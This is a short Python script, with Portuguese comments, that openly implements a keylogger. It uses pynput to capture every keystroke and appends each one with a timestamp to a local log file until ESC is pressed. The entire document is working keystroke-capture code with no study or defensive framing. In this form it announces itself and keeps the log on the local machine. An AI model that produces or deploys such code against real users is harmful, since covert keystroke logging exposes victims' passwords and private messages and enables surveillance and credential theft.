from pynput import keyboard
import os
from datetime import datetime

# Garante que a pasta existe
log_dir = "Keylogger/logs"
os.makedirs(log_dir, exist_ok=True)

log_file = os.path.join(log_dir, "keys.txt")

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        key_value = key.char
    except AttributeError:
        key_value = str(key)

    with open(log_file, "a", encoding="utf-8") as file:
        file.write(f"[{timestamp}] {key_value}\n")

    if key == keyboard.Key.esc:
        print("Encerrando keylogger...")
        return False

print("Keylogger iniciado. Pressione ESC para encerrar.")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()